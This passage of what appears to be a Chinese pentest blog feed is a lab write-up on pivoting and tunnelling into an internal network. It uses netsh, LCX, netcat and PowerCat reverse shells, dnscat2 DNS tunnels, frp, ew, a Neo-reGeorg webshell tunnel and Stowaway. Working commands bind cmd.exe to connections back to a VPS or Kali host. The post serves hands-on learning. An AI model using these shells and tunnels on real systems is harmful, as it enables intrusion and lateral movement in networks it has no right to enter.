src="https://gitee.com/lcdm123/image/raw/master/image-20210902153812422.png" alt="image-20210902153812422"></p><p><img src="D:\markdown\image-20210902153827988.png" alt="image-20210902153827988"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶场是我第二遍打了，整体比较简单，主要是为了熟练流程和工具的使用。</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道搭建</title>
    <link href="/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="内网隧道搭建实践"><a href="#内网隧道搭建实践" class="headerlink" title="内网隧道搭建实践"></a>内网隧道搭建实践</h1><h2 id="netsh隧道搭建"><a href="#netsh隧道搭建" class="headerlink" title="netsh隧道搭建"></a>netsh隧道搭建</h2><p>  跳板机：win7    内网主机：Centos 7</p><h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><p>利用边界的被拿下的web服务器建立端口转发规则，使问利用web服务器作为跳板与内网主机建立联系</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png" alt="image-20210805091644761"></p><p>在win7中执行：<code>netsh interface portproxy add v4tov4 listenport=4567 connectaddress=10.10.3.129 connectport=22</code>（需要管理员权限）</p><p>查看是否开启：<code>netsh interface portproxy show all</code></p><p>删除规则：<code>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4567</code></p><p>测试端口转发结果，连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804114121495.png" alt="image-20210804114121495"></p><h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><p>本地防火墙只允许某些端口出网，可以利用netsh搭建本地端口转发，将不允许出网的端口转发到白名单端口上<code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=12345 connectaddress=127.0.0.1 connectport=3389</code></p><p>或者利用netsh操作本地的防火墙设置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow  # 开放防火墙端口<br>netsh advfirewall<span class="hljs-built_in"> firewall </span>delete rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 #删除规则<br></code></pre></td></tr></table></figure><h2 id="LCX端口代理"><a href="#LCX端口代理" class="headerlink" title="LCX端口代理"></a>LCX端口代理</h2><p>Windows的为lcx.exe，Linux的为portmap（这个工具有点老了）</p><p>下载：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091741766.png" alt="image-20210805091741766"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">windows：lcx.exe -slave vps-ip vps-port  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> port 本地端口转发到VPS<br>lcx.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">3389</span><br>lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">33891</span><br></code></pre></td></tr></table></figure><p>将本地端口转发到VPS上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804142654140.png" alt="image-20210804142654140"></p><blockquote><p>可能是工具太老了，连接上一会就自动断开了</p></blockquote><h3 id="内网主机端口转发"><a href="#内网主机端口转发" class="headerlink" title="内网主机端口转发"></a>内网主机端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091809826.png" alt="image-20210805091809826"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl">web服务器上：Lcx.exe -slave  vps-ip  vps-port  内网主机ip  内网主机目标端口<br>Lcd.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.6</span> <span class="hljs-number">22</span><br><br>vps：Lcx.exe -<span class="hljs-section">listen</span> vps-port 内网主机目标端口<br>Lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">221</span><br></code></pre></td></tr></table></figure><p>VPS与web服务器建立通道，将内网主机端口转发到VPS上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143305962.png" alt="image-20210804143305962"></p><p>利用通道连接到内网主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143224155.png" alt="image-20210804143224155"></p><h2 id="NetCat代理"><a href="#NetCat代理" class="headerlink" title="NetCat代理"></a>NetCat代理</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091925952.png" alt="image-20210805091925952"></p><h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>服务器：nc<span class="hljs-number">64</span>.exe -lvp <span class="hljs-number">4445</span> -e c:\Windows\System<span class="hljs-number">32</span>\cmd.exe  监听连接请求<br><span class="hljs-attribute">VPS</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">4445</span>  请求连接<br></code></pre></td></tr></table></figure><p>连接成功获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145253006.png" alt="image-20210804145253006"></p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">web服务器：nc64.exe vps-ip vps-port -e c:\Windows\System32\cmd.exe<br>VPS：nc64.exe -lvp<span class="hljs-built_in"> port </span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145741200.png" alt="image-20210804145741200"></p><blockquote><p>个人觉得不用太纠结正反，能连上就可以了 =_=</p></blockquote><h2 id="PowerCat代理"><a href="#PowerCat代理" class="headerlink" title="PowerCat代理"></a>PowerCat代理</h2><blockquote><p>PowerCat 是nc的powershell版 ，使用方法和nc差不多</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">上传到web服务器中，然后修改服务器powershell策略并导入脚本<br><span class="hljs-keyword">Set</span>-ExecutionPolicy remotesigned <br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powercat.ps1<br></code></pre></td></tr></table></figure><h3 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091942498.png" alt="image-20210805091942498"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PowerCat</span>：powercat -l -p <span class="hljs-number">6666</span> -e cmd.exe -v<br><span class="hljs-attribute">vps</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804155833809.png" alt="image-20210804155833809"></p><h3 id="反向连接shell"><a href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091945928.png" alt="image-20210805091945928"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">PowerCat：powercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -p <span class="hljs-number">6666</span> -e cmd.exe -v<br>vps：nc64.exe -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804160206174.png" alt="image-20210804160206174"></p><h3 id="搭建DNS隧道"><a href="#搭建DNS隧道" class="headerlink" title="搭建DNS隧道"></a>搭建DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092300471.png" alt="image-20210805092300471"></p><blockquote><p>PowerCat的DNS通信是基于<code>dnscat</code>设计的，在使用<code>dnscat</code>之前需要下载和进行编译</p></blockquote><p>Kali下载dnscat2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/server/</span><br>gem install bundler<br>bundle install<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162355288.png" alt="image-20210804162355288"></p><p>kali执行：<code>ruby dnscat2.rb ttpowercat.test -e open --no-cache</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162932809.png" alt="image-20210804162932809"></p><p>web主机：<code>powercat -c kali-ip -p 53 -dns ttpowercat.test -e cmd.exe </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163057542.png" alt="image-20210804163057542"></p><p>kali执行：<code>session -i 1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163157341.png" alt="image-20210804163157341"></p><p>搭建成功</p><h3 id="跳板NC隧道"><a href="#跳板NC隧道" class="headerlink" title="跳板NC隧道"></a>跳板NC隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092357659.png" alt="image-20210805092357659"></p><p>将域控制器交互到kali</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">内网主机：powercat -l -v -p <span class="hljs-number">9999</span> -e cmd.exe<br>web服务器：powercat -l -v -p <span class="hljs-number">2345</span> -r tcp:内网主机ip:<span class="hljs-number">9999</span><br>kali：nc web-ip <span class="hljs-number">2345</span> -vv<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171831544.png" alt="image-20210804171831544"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171903589.png" alt="image-20210804171903589"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171720544.png" alt="image-20210804171720544"></p><h3 id="跳板DNS隧道"><a href="#跳板DNS隧道" class="headerlink" title="跳板DNS隧道"></a>跳板DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092426042.png" alt="image-20210805092426042"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">web</span>服务器：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">dns</span><span class="hljs-selector-pseudo">:kali-ip</span><span class="hljs-selector-pseudo">::ttpowercat.test</span><br><span class="hljs-selector-tag">kali</span>：<span class="hljs-selector-tag">ruby</span> <span class="hljs-selector-tag">dnscat2</span><span class="hljs-selector-class">.rb</span> <span class="hljs-selector-tag">ttpowercat</span><span class="hljs-selector-class">.test</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">--no-cache</span><br>内网：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-c</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.131</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172742238.png" alt="image-20210804172742238"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172718398.png" alt="image-20210804172718398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172759548.png" alt="image-20210804172759548"></p><p>获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172833678.png" alt="image-20210804172833678"></p><h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>下载：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。frp和端口转发并不是一样的，这样的frp是使用了内网的全端口全流量的</p><h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101242047.png" alt="image-20210805101242047"></p><p>利用win10作为服务端，Web作为客户端搭建内网代理</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows10<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=2345<br><span class="hljs-attribute">plugin</span>=socks5<br>执行开启命令<br>frpc.exe -c frpc.ini<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101810242.png" alt="image-20210805101810242"></p><p>测试连接成功了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101013784.png" alt="image-20210805101013784"></p><p>未搭建代理时，连接失败</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805102024585.png" alt="image-20210805102024585"></p><p>搭建代理后，连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805100948602.png" alt="image-20210805100948602"></p><h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114923729.png" alt="image-20210805114923729"></p><p>利用在win10（frps）和web服务器（frpc）搭建代理的基础上在Web服务器（frps）和内网主机1（frpc）上搭建代理，访问内网主机2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>Web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">local_ip</span>=10.10.3.18 # 不能写127.0.0.1 反正写了就会错误<br><span class="hljs-attribute">local_port</span>=6000 # web主机被内网主机连接的端口<br><span class="hljs-attribute">remote_port</span>=6000 # 映射到VPS的端口<br><br><span class="hljs-comment"># frps.ini</span><br>[common]<br><span class="hljs-attribute">bind_addr</span>=web-ip<br>bind_port = 7000<br><br>内网主机1<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 10.10.3.18 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=6000<br><span class="hljs-attribute">plugin</span>=socks5<br><br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114755986.png" alt="image-20210805114755986"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114714780.png" alt="image-20210805114714780"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114604466.png" alt="image-20210805114604466"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114411169.png" alt="image-20210805114411169"></p><blockquote><p>连接建立了，但是后面的代理服务器连接失败不知道具体是什么意思，但是以及可以连接内网主机了</p></blockquote><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114320315.png" alt="image-20210805114320315"></p><p>三级代理就类似的来即可</p><h2 id="ew代理"><a href="#ew代理" class="headerlink" title="ew代理"></a>ew代理</h2><h3 id="一级代理-1"><a href="#一级代理-1" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130313193.png" alt="image-20210805130313193"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_win_32.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_win_32.exe -s rssocks -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131042550.png" alt="image-20210805131042550"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130844477.png" alt="image-20210805130844477"></p><p>连接内网主机成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131203118.png" alt="image-20210805131203118"></p><h3 id="二级代理-1"><a href="#二级代理-1" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805133050867.png" alt="image-20210805133050867"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s ssocksd -l <span class="hljs-number">9000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132433015.png" alt="image-20210805132433015"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132401981.png" alt="image-20210805132401981"></p><p>隧道搭建成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132209244.png" alt="image-20210805132209244"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132241110.png" alt="image-20210805132241110"></p><blockquote><p>连接时工具会突然停止运行，具体原因不清楚</p></blockquote><h3 id="三级代理"><a href="#三级代理" class="headerlink" title="三级代理"></a>三级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805135020239.png" alt="image-20210805135020239"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">9000</span> -e <span class="hljs-number">7000</span><br>内网主机<span class="hljs-number">2</span>：ew_for_Win.exe -s rssocks -d <span class="hljs-number">10.10</span><span class="hljs-number">.21</span><span class="hljs-number">.128</span> -e <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><blockquote><p>隧道的级数越大所连接需要的时间就越长了</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140125688.png" alt="image-20210805140125688"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140156398.png" alt="image-20210805140156398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140253519.png" alt="image-20210805140253519"></p><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140008622.png" alt="image-20210805140008622"></p><blockquote><p>工具感觉还是容易被杀毒软件杀掉，还是需要自己去编写，或者自己做好免杀处理</p></blockquote><h2 id="Neo-reGeory"><a href="#Neo-reGeory" class="headerlink" title="Neo-reGeory"></a>Neo-reGeory</h2><blockquote><p>建立HTTP隧道的工具，适用于目标服务器只开放了80端口，通过80端口去探测内网服务器。（利用文件上传漏洞即可）</p></blockquote><p>下载：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>参考连接</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110389330">https://blog.csdn.net/qq_32393893/article/details/110389330</a></p><p>运行命令生成后面文件：<code>python neoreg.py generate -k lcdm123 </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806093956906.png" alt="image-20210806093956906"></p><p>上传服务器支持的对应文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094624888.png" alt="image-20210806094624888"></p><blockquote><p>测试文件在线</p></blockquote><p>上传后本地搭建连接：<code>python neoreg.py -k lcdm123 -u http://web-ip/tunnel.php -p 6000</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094746686.png" alt="image-20210806094746686"></p><p>测试连接代理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094918799.png" alt="image-20210806094918799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806095050984.png" alt="image-20210806095050984"></p><p>成功了</p><h2 id="NPC-amp-NPS"><a href="#NPC-amp-NPS" class="headerlink" title="NPC&amp;NPS"></a>NPC&amp;NPS</h2><p><a href="https://aquilao.github.io/Blog/NPS/">https://aquilao.github.io/Blog/NPS/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907145149529.png" alt="image-20210907145149529"></p><p>这个的运行是身份简单的，由 NPS 生成一个 web 服务端，然后将 npc上传到靶机上按照 web 服务端给出的命令执行即可</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># NPS 配置  编辑 conf/nps.conf</span><br><span class="hljs-comment">#web</span><br>web_host=192.168.1.15  <span class="hljs-comment"># 服务器的ip</span><br>web_username=admin  <span class="hljs-comment"># 登录用户名</span><br>web_password=admin  <span class="hljs-comment"># 登录密码</span><br>web_port = 8080   <span class="hljs-comment"># web端口</span><br><br>将工具上传到了服务器后，如果是第一此执行则需要运行  sudo ./nps install<br>开启nps  nps start<br>./nps test|<span class="hljs-string">start</span>|<span class="hljs-string">stop</span>|<span class="hljs-string">restart</span>|<span class="hljs-string">status  测试配置文件</span>|<span class="hljs-string">启动</span>|<span class="hljs-string">停止</span>|<span class="hljs-string">重启</span>|<span class="hljs-string">状态</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907150908264.png" alt="image-20210907150908264"></p><blockquote><p>登录到 web 端，然后点击客户端，使用新增，之后就会有连接的命令，只需要把 npc 的传入靶机运行即可</p></blockquote><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><blockquote><p>比较新款的使用 go 编写的内网代理工具，星链计划推荐，应该会持续更新</p></blockquote><ul><li><code>admin</code> 渗透测试者使用的主控端</li><li><code>agent</code> 渗透测试者部署的被控端</li></ul><p><strong>Admin</strong></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml">参数:<br>-<span class="ruby">l 被动模式下的监听地址[ip]<span class="hljs-symbol">:&lt;port&gt;</span></span><br><span class="ruby">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="ruby">-c 主动模式下的目标节点地址</span><br><span class="ruby">--proxy socks5代理服务器地址</span><br><span class="ruby">--proxyu socks5代理服务器用户名(可选)</span><br><span class="ruby">--proxyp socks5代理服务器密码(可选)</span><br><span class="ruby">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></code></pre></td></tr></table></figure><p><strong>Agent</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">参数:<br>-l 被动模式下的监听地址[ip]:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span></span><br>-s 节点通信加密密钥<br>-c 主动模式下的目标节点地址<br>--proxy socks5代理服务器地址<br>--proxyu socks5代理服务器用户名(可选)<br>--proxyp socks5代理服务器密码(可选)<br>--reconnect 重连时间间隔<br>--rehost 端口复用时复用的IP地址<br>--report 端口复用时复用的端口号<br>--up 上游协议类型,默认为裸TCP流量,可选HTTP<br>--down 下游协议类型,默认为裸TCP流量,可选HTTP<br></code></pre></td></tr></table></figure><blockquote><p>功能太多，使用步骤好复杂呀:cry:</p></blockquote><h3 id="一级代理-2"><a href="#一级代理-2" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917140954098.png" alt="image-20210917140954098"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">win10：windows_x86_admin.exe -l <span class="hljs-number">9000</span> -s password <br>web服务器: windows_x86_agent.exe -c <span class="hljs-number">192.168</span><span class="hljs-number">.44</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span> -reconnect <span class="hljs-number">5</span><br># 这样两台电脑就建立了连接了<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143113458.png" alt="image-20210917143113458"></p><p>使用ssh 连接内网主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143151144.png" alt="image-20210917143151144"></p><p>开启 socks5 